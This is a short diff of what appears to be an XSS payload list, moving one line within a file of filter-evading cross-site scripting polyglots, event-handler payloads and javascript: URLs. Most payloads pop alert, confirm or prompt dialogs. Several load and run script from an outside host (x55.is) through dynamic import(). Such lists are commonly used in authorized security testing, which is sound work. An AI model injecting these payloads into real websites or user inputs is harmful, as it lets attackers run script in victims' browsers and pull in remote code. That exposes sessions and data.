@@ -1,4 +1,3 @@
-<math><x xlink:href=javascript​:confirm`1`>click
 <sVg/onfake="x=y"oNload=;1^(co\u006efirm)``^1//
 JavaScript​://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--</Title/<​/Style/<​/Script/</textArea/</iFrame>\74k<K/contentEditable/autoFocus/OnFocus​=/*${/*/;{/**/(import(/https:\\x55.is/.source))}//\76-->
 1'"<A HRef=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>
@@ -15,6 +14,7 @@ JavaScript://%250Dtop.confirm?.(1)//
 <a/href="/alert(1)/">
 <a/href="/prompt(1)/"<
 <img/src="/prompt(1)/"<
+<math><x xlink:href=javascript​:confirm`1`>click
 <xss onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></xss>
 JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76--> 
 javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
